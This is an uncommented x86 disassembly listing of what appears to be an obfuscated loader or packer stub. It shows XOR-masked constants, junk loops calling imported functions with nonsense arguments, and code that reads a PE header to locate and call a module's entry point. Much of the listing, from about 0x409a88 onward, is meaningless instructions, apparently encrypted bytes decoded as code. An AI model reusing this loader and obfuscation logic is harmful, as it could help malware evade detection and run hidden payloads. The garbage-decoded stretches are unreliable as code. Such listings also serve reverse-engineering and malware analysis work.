  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e644
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x4302dd,0x14
  4098db:	cmp    DWORD PTR ds:0x4302dd,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x4302dd,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42eab3
  40991f:	mov    eax,ds:0x4302dd
  409924:	dec    eax
  409925:	mov    ds:0x4302dd,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x430357
  409934:	or     eax,DWORD PTR ds:0x43035f
  40993a:	mov    ds:0x430357,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e650,0x13
  40994c:	cmp    DWORD PTR ds:0x42e650,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e650,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42eab7
  409979:	mov    ecx,DWORD PTR ds:0x42e650
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e650,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x4302c9,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x4302d9,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x43034f,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x43034f
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x43034f,edi
  4099bf:	cmp    DWORD PTR ds:0x43034f,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x4302bd
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42e947
  4099e8:	cmp    DWORD PTR ds:0x43034f,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x43034f
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x43034f,edi
  409a02:	cmp    DWORD PTR ds:0x43034f,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x43035f,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x4302b5,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x4302b5
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x4302b5,ebx
  409a35:	cmp    DWORD PTR ds:0x4302b5,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42e883
  409a50:	cmp    DWORD PTR ds:0x4302b5,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x4302b5
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x4302b5,ebx
  409a6a:	cmp    DWORD PTR ds:0x4302b5,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e648
  409a7d:	or     DWORD PTR ds:0x42ec4b,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	inc    edi
  409a95:	mov    ah,0xb8
  409a97:	aam    0x59
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409a24
  409aa1:	add    DWORD PTR [ecx-0x52],edi
  409aa4:	ret    0xf533
  409aa7:	xchg   ebx,eax
  409aa8:	loope  0x409aed
  409aaa:	shl    BYTE PTR [ecx-0x73],0xa7
  409aae:	mov    ds:0xd2794f98,al
  409ab3:	jmp    0xae30990b
  409ab8:	in     al,dx
  409ab9:	test   al,0x8f
  409abb:	ret    
  409abc:	ja     0x409b0d
  409abe:	jno    0x409aa4
  409ac0:	jbe    0x409aad
  409ac2:	loop   0x409a9d
  409ac4:	adc    edi,DWORD PTR [edx+0x49757c55]
  409aca:	popf   
  409acb:	lahf   
  409acc:	add    DWORD PTR [eax+0x5b978f07],ebx
  409ad2:	xor    eax,0xde6a60dc
  409ad7:	dec    esi
  409ad8:	adc    BYTE PTR [ebp-0x1b16d1a2],0xae
  409adf:	sub    eax,0x9ea0a764
  409ae4:	out    0xcc,al
  409ae6:	dec    edx
  409ae7:	push   edi
  409ae8:	out    0xab,al
  409aea:	jle    0x409add
  409aec:	(bad)  
  409aed:	fsubr  QWORD PTR [ebp-0x474f0d8e]
  409af3:	rcr    BYTE PTR [esi-0x6490837a],0xd6
  409afa:	lods   eax,DWORD PTR ds:[esi]
  409afb:	xchg   edi,eax
  409afc:	sbb    ebx,ecx
  409afe:	cmp    dl,0x16
  409b01:	xor    ah,BYTE PTR [eax-0x44d66ae5]
  409b07:	xchg   BYTE PTR [edx-0x34e01fc2],ah
  409b0d:	outs   dx,BYTE PTR ds:[esi]
  409b0e:	cmc    
  409b0f:	loop   0x409b22
  409b11:	pushf  
  409b12:	pop    edi
  409b13:	mov    ds:0xf7b221f6,al
  409b18:	retf   
  409b19:	lds    esi,FWORD PTR [edi+0x74]
  409b1c:	xchg   ecx,eax
  409b1d:	inc    eax
  409b1e:	(bad)  
  409b1f:	or     al,0x14
  409b21:	test   esp,ebp
  409b23:	stos   BYTE PTR es:[edi],al
  409b24:	(bad)  
  409b26:	adc    eax,0x14354d1d
  409b2b:	pop    eax
  409b2c:	test   DWORD PTR [ebp+ecx*1-0x354618bb],0x89997df
  409b37:	jmp    0x6f8a:0x768473e5
  409b3e:	push   es
  409b3f:	jle    0x409ade
  409b41:	bound  ecx,QWORD PTR [ecx+0x1d31aea8]
  409b47:	cmc    
  409b48:	sub    cl,BYTE PTR [ebx+0x177b914d]
  409b4e:	lea    eax,[esi+0x46]
  409b51:	data16 fistp QWORD PTR [esp+ecx*8-0x36c806da]
  409b59:	ja     0x409b82
  409b5b:	add    dh,BYTE PTR [ecx-0x5b45c89f]
  409b61:	xor    al,0xcd
  409b63:	aaa    
  409b64:	push   ebp
  409b65:	mov    eax,ds:0x615a7926
  409b6a:	jbe    0x409b9c
  409b6c:	(bad)  
  409b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b6e:	mov    ebp,0x46887025
  409b73:	jmp    0x409b58
  409b75:	aaa    
  409b76:	call   0xdcd669ef
  409b7b:	push   ebp
  409b7c:	mov    dh,BYTE PTR [esi]
  409b7e:	xor    eax,0xb9e9a4e2
  409b83:	hlt    
  409b84:	sub    BYTE PTR fs:[edi+0xfc612a4],ch
  409b8b:	retf   
  409b8c:	jno    0x409b52
  409b8e:	mov    esp,edx
  409b90:	xchg   ebx,eax
  409b91:	push   DWORD PTR [ecx+0x45]
  409b94:	lock sub al,BYTE PTR [esi]
  409b97:	add    esp,DWORD PTR [edi+0xcbeb0d4]
  409b9d:	popf   
  409b9e:	aad    0xe
  409ba0:	test   eax,0x634dabe9
  409ba5:	or     ebp,DWORD PTR [eax-0x7a]
  409ba8:	mov    ds,WORD PTR [ecx+0x3840b37]
  409bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409baf:	mov    al,ds:0xf94b37fc
  409bb4:	fs (bad) 
  409bb7:	mov    al,ds:0xb2b03953
  409bbc:	daa    
  409bbd:	adc    esi,edx
  409bbf:	mov    ah,BYTE PTR [esi-0x75778d28]
  409bc5:	inc    esp
  409bc6:	and    al,0x65
  409bc8:	js     0x409be4
  409bca:	addr16 cmp ebx,ebx
  409bcd:	call   0x2ac5cbdf
  409bd2:	leave  
  409bd3:	pop    esi
  409bd4:	in     al,dx
  409bd5:	cmp    eax,0x9beff9f3
  409bda:	push   esi
  409bdb:	out    0x40,al
  409bdd:	dec    esp
  409bde:	push   0xa9e2900e
  409be3:	inc    ebp
  409be4:	jmp    0x409b9d
  409be6:	xchg   edx,eax
  409be7:	sbb    bh,al
  409be9:	dec    edi
  409bea:	adc    eax,0xfb689cff
  409bef:	mov    DWORD PTR [ebp-0x2a],esi
  409bf2:	aas    
  409bf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bf4:	xchg   edi,eax
  409bf5:	push   ebp
  409bf6:	or     esi,DWORD PTR [ebp-0x5e]
  409bf9:	js     0x409bda
  409bfb:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  409bfd:	test   al,0x56
  409bff:	iret   
  409c00:	xor    DWORD PTR [ebx-0x542b53a7],0xb4555385
  409c0a:	(bad)  
  409c0b:	rcr    dh,0x66
  409c0e:	and    esi,ebx
  409c10:	pop    ebx
  409c11:	push   ds
  409c12:	lds    ebp,FWORD PTR [edi]
  409c14:	lods   eax,DWORD PTR ds:[esi]
  409c15:	jns    0x409c0c
  409c17:	enter  0xe1f4,0x18
  409c1b:	rcl    BYTE PTR [esp+ecx*2-0x24],0xb4
  409c20:	pop    es
  409c21:	mov    eax,0x7b8d73a7
  409c26:	or     eax,0x17f30d95
  409c2b:	inc    edx
  409c2c:	imul   ecx,esi,0x2fa325d3
  409c32:	sbb    bl,BYTE PTR [eax+0x7b]
  409c35:	fnstsw WORD PTR [esi+eax*4+0x69cc2b71]
  409c3c:	and    dh,BYTE PTR [esp+ebx*2-0x3f]
  409c40:	out    dx,al
  409c41:	mov    fs,esp
  409c43:	mov    esi,ds
  409c45:	lea    esi,[esi+0x67779748]
  409c4b:	pop    esp
  409c4c:	adc    eax,0x3074e5f5
  409c51:	sbb    al,0x74
  409c53:	(bad)  
  409c54:	xchg   edi,eax
  409c55:	jns    0x409bf3
  409c57:	repnz not cl
  409c5a:	mov    esp,0x8f1b4591
  409c5f:	int    0x12
  409c61:	out    dx,eax
  409c62:	pop    esi
  409c63:	push   edx
  409c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c65:	out    0xe5,al
  409c67:	sub    eax,0x40d3865e
  409c6c:	xor    BYTE PTR [ebx-0x35],bl
  409c6f:	pushf  
  409c70:	adc    ecx,esi
  409c72:	in     eax,dx
  409c73:	dec    esi
  409c74:	jmp    0x5a48:0xd409ff26
  409c7b:	hlt    
  409c7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c7d:	mov    bl,0x9
  409c7f:	repnz fist WORD PTR [edx]
  409c82:	pop    esi
  409c83:	out    dx,eax
  409c84:	push   ebx
  409c85:	and    BYTE PTR [edx+0x59],cl
  409c88:	out    0xcb,al
  409c8a:	ret    
  409c8b:	loop   0x409c5e
  409c8d:	cmp    eax,0x39b0eb9a
  409c92:	dec    ecx
  409c93:	retf   
  409c94:	ret    
  409c95:	pop    esi
  409c96:	lock add ah,bh
  409c99:	mov    BYTE PTR [ebp-0x6fc04082],dh
  409c9f:	and    DWORD PTR [ebx+0x6b],ecx
  409ca2:	adc    esi,esp
  409ca4:	mov    ds:0xd4a2ea01,eax
  409ca9:	ror    BYTE PTR [edx],1
  409cab:	dec    ebp
  409cac:	mov    ds:0x1e0a6e40,al
  409cb1:	cmp    ebp,esi
  409cb3:	test   al,0xfa
  409cb5:	push   edx
  409cb6:	fsub   DWORD PTR [edi+0xa]
  409cb9:	sub    BYTE PTR [edi],bh
  409cbb:	jb     0x409c80
  409cbd:	cmp    eax,0xe4278d57
  409cc2:	and    eax,0x1287d95c
  409cc7:	push   0xa8789063
  409ccc:	aam    0x7b
  409cce:	sub    edx,edx
  409cd0:	inc    esp
  409cd1:	add    eax,0xa94f378f
  409cd6:	adc    DWORD PTR [edi-0x4e],0xffffffd9
  409cda:	hlt    
  409cdb:	test   al,0xb8
  409cdd:	add    BYTE PTR [ebp-0x4d],0x56
  409ce1:	inc    esi
  409ce2:	push   ebx
  409ce3:	xlat   BYTE PTR ds:[ebx]
  409ce4:	xchg   ebp,eax
  409ce5:	xchg   edx,eax
  409ce6:	aam    0x6a
  409ce8:	in     al,dx
  409ce9:	outs   dx,DWORD PTR ds:[si]
  409ceb:	loop   0x409c77
  409ced:	jnp    0x409d1c
  409cef:	cmp    DWORD PTR [eax-0x1df38fa3],0x538f77d9
  409cf9:	dec    ecx
  409cfa:	mov    cl,0x8c
  409cfc:	push   ebp
  409cfd:	xchg   edi,eax
  409cfe:	jle    0x409d7f
  409d00:	push   edx
  409d01:	sub    DWORD PTR [ebx-0x5f420a0e],edx
  409d07:	push   ds
  409d08:	jne    0x409ca4
  409d0a:	retf   0x3600
  409d0d:	fsubp  st(6),st
  409d0f:	pop    ebp
  409d10:	and    BYTE PTR [edx],dl
  409d12:	stos   DWORD PTR es:[edi],eax
  409d13:	repnz sub eax,0x62d079fb
  409d19:	sub    al,BYTE PTR [edi-0x55d9a185]
  409d1f:	jp     0x409d61
  409d21:	push   esp
  409d22:	out    dx,eax
  409d23:	mov    esp,0x25d4c773
  409d28:	(bad)  
  409d2a:	dec    ebp
  409d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d2c:	mov    al,ds:0x40a41588
  409d31:	pushf  
  409d32:	push   esi
  409d33:	and    ah,BYTE PTR [edx]
  409d35:	retf   0xd181
  409d38:	xchg   esp,eax
  409d39:	xchg   esi,eax
  409d3b:	xchg   ebx,eax
  409d3c:	rol    BYTE PTR [ecx],0x1b
  409d3f:	push   eax
  409d40:	pop    eax
  409d41:	mov    dl,0xae
  409d43:	neg    BYTE PTR [ebx]
  409d45:	dec    esi
  409d46:	xor    al,BYTE PTR [edi+0x49]
  409d49:	jge    0x409d25
  409d4b:	(bad)  [ebp+0x68]
  409d4e:	ins    DWORD PTR es:[edi],dx
  409d4f:	cld    
  409d50:	mov    al,fs:0xad5c631
  409d56:	(bad)  
  409d57:	outs   dx,DWORD PTR ds:[esi]
  409d58:	int    0xb0
  409d5a:	ins    DWORD PTR es:[edi],dx
  409d5b:	cmp    eax,0x962b5805
  409d60:	or     eax,ebp
  409d62:	add    BYTE PTR [edx-0x3df10dc],bh
  409d68:	add    esp,esi
  409d6a:	xchg   ebx,eax
  409d6b:	push   ds
  409d6c:	push   eax
  409d6d:	test   al,0x97
  409d6f:	mov    ecx,ecx
  409d71:	mov    edi,0x98c1d2ed
  409d76:	inc    esp
  409d77:	xlat   BYTE PTR ds:[ebx]
  409d78:	dec    edx
  409d79:	xchg   edi,eax
  409d7a:	addr16 aas 
  409d7c:	fistp  QWORD PTR [ebp-0x43]
  409d7f:	or     eax,DWORD PTR gs:[edx]
  409d82:	ficomp DWORD PTR [edx+edx*2]
  409d85:	outs   dx,DWORD PTR ds:[esi]
  409d86:	sub    bl,BYTE PTR [edi]
  409d88:	and    BYTE PTR [eax],ch
  409d8a:	lds    ebx,FWORD PTR [edi+0xd]
  409d8d:	sub    al,0x26
  409d8f:	imul   ebp,edi,0x24
  409d92:	add    BYTE PTR [edi-0x76],dl
  409d95:	lea    edi,[ebx]
  409d97:	test   eax,0x5cc1a813
  409d9c:	xor    al,0xc3
  409d9e:	or     esi,DWORD PTR [edi-0x41ed81c5]
  409da4:	outs   dx,DWORD PTR ds:[esi]
  409da5:	pop    ebp
  409da6:	xor    ah,cl
  409da8:	mov    ds:0x4d371887,al
  409dad:	xor    ch,dh
  409daf:	push   es
  409db0:	or     eax,0x84ee1b55
  409db5:	repz shl DWORD PTR [edi-0x76],cl
  409db9:	jg     0x409de1
  409dbb:	mov    bl,0xae
  409dbd:	mov    BYTE PTR [eax-0x1],al
  409dc0:	dec    esi
  409dc1:	cmp    al,0x5d
  409dc3:	(bad)
  409dc7:	sahf   
  409dc8:	cli    
  409dc9:	rcr    ebp,0x1b
  409dcc:	mov    esi,0x3ef0695
  409dd1:	(bad)  
  409dd2:	mov    ebx,DWORD PTR ds:0x42e658
  409dd8:	add    ebx,DWORD PTR ds:0x430357
  409dde:	mov    DWORD PTR ds:0x42e658,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x4302dd,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x43034f,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x4302d1
  409e03:	and    DWORD PTR ds:0x4302f1,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x4302cd,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e5e
  409e2b:	test   BYTE PTR [ebp-0x74],cl
  409e2e:	or     eax,ebx
  409e30:	jle    0x409eb0
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e32
  409e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e38:	loope  0x409e02
  409e3a:	xor    BYTE PTR [esi+edi*2+0x4b],dl
  409e3e:	out    0xe5,al
  409e40:	sub    esi,DWORD PTR [edi+edi*2]
  409e43:	leave  
  409e44:	ret    
  409e45:	dec    eax
  409e46:	mov    esi,0x3cf83511
  409e4b:	adc    eax,0x142b185f
  409e50:	aam    0x12
  409e52:	clc    
  409e53:	div    BYTE PTR [edi]
  409e55:	(bad)  
  409e56:	in     eax,0x6
  409e58:	jmp    0x409e90
  409e5a:	jno    0x409e3b
  409e5c:	(bad)  
  409e5d:	adc    al,0x32
  409e5f:	pusha  
  409e60:	cmp    edi,DWORD PTR [ecx-0x24649954]
  409e66:	pop    esp
  409e67:	loopne 0x409ea4
  409e69:	jns    0x409e7e
  409e6b:	pushf  
  409e6c:	mov    bh,0x22
  409e6e:	jmp    0x2478:0xcb5a2bca
  409e75:	mov    eax,ds:0x9193e948
  409e7a:	(bad)  
  409e7b:	mov    dh,0xd7
  409e7d:	dec    esi
  409e7e:	and    ch,bl
  409e80:	int    0x21
  409e82:	cmp    dl,dh
  409e84:	add    bx,WORD PTR [edi+0x6a52f91c]
  409e8b:	push   es
  409e8c:	jmp    0x409eae
  409e8e:	ins    DWORD PTR es:[edi],dx
  409e8f:	sar    BYTE PTR ds:0x30b6d3bd,cl
  409e95:	in     eax,0x72
  409e97:	fisubr WORD PTR [ebx+0x4c602d1d]
  409e9d:	mov    ebx,0xb20b9b05
  409ea2:	pop    esp
  409ea3:	fwait
  409ea4:	ss icebp 
  409ea6:	xchg   edx,eax
  409ea7:	xor    BYTE PTR [esi-0x31],dh
  409eaa:	or     BYTE PTR [ebx+0x62634673],ch
  409eb0:	xchg   edi,eax
  409eb1:	ret    0xd165
  409eb4:	dec    edx
  409eb5:	xchg   ebp,eax
  409eb6:	pusha  
  409eb7:	les    edx,FWORD PTR [eax+0x5e]
  409eba:	fisubr DWORD PTR [edx-0x46879f65]
  409ec0:	inc    esi
  409ec1:	std    
  409ec2:	jle    0x409ed3
  409ec4:	ja     0x409ef2
  409ec6:	xchg   ecx,eax
  409ec7:	data16 sub al,0xc0
  409eca:	push   0x7e04d98a
  409ecf:	xlat   BYTE PTR ds:[ebx]
  409ed0:	out    dx,al
  409ed1:	rcr    ebx,0xd8
  409ed4:	int3   
  409ed5:	mov    al,0x3e
  409ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ed8:	ins    BYTE PTR es:[edi],dx
  409ed9:	out    dx,al
  409eda:	add    BYTE PTR [ebx-0x5c41ca01],dh
  409ee0:	xor    bl,BYTE PTR [ebx-0x1d4b8fc3]
  409ee6:	and    dl,BYTE PTR [edi+0x2ed0c356]
  409eec:	bound  ebx,QWORD PTR [edi-0x46]
  409eef:	pushf  
  409ef0:	mov    bl,0x90
  409ef2:	pop    ebx
  409ef3:	cmc    
  409ef4:	xor    dh,BYTE PTR [ecx]
  409ef6:	pop    es
  409ef7:	sub    al,0x60
  409ef9:	mov    eax,0x59566491
  409efe:	push   esp
  409eff:	xor    ah,cl
  409f01:	int3   
  409f02:	dec    ebx
  409f03:	mov    eax,ds:0x97d6fbe7
  409f08:	iret   
  409f09:	(bad)  
  409f0a:	sub    ah,ah
  409f0c:	es add BYTE PTR ds:[edx],0xff
  409f11:	call   0xcb2e:0x70927b02
  409f18:	test   BYTE PTR [ecx-0x7f],bl
  409f1b:	adc    ch,dl
  409f1d:	loop   0x409f39
  409f1f:	int3   
  409f20:	out    0xc,al
  409f22:	or     DWORD PTR [edx+0x20ab5541],ecx
  409f28:	sar    BYTE PTR [ecx+0x3b],0x85
  409f2c:	popf   
  409f2d:	call   DWORD PTR [ebx]
  409f2f:	inc    ebx
  409f30:	jp     0x409eeb
  409f32:	arpl   WORD PTR [edx-0x4c],bx
  409f35:	stc    
  409f36:	ds ret 
  409f38:	(bad)  
  409f3a:	pop    ds
  409f3b:	dec    ebp
  409f3c:	and    DWORD PTR [edi+ebx*4],ecx
  409f3f:	sbb    eax,0x7f0b26d2
  409f44:	mov    eax,0xc83f277b
  409f49:	xchg   esp,eax
  409f4a:	adc    DWORD PTR [ebx-0x6fe6d9f],0xf822f3d0
  409f54:	mov    ah,0x98
  409f56:	icebp  
  409f57:	xor    al,0x10
  409f59:	fs jae 0x409fdb
  409f5c:	and    eax,edi
  409f5e:	push   edi
  409f5f:	clc    
  409f60:	xor    al,0x1d
  409f62:	jg     0x409f91
  409f64:	jmp    0x409f56
  409f66:	test   DWORD PTR ss:0x4da553fe,edi
  409f6d:	mov    ds:0xe9e00ec9,al
  409f72:	ds pop ss
  409f74:	in     al,dx
  409f75:	ret    0xcbd4
  409f78:	dec    esi
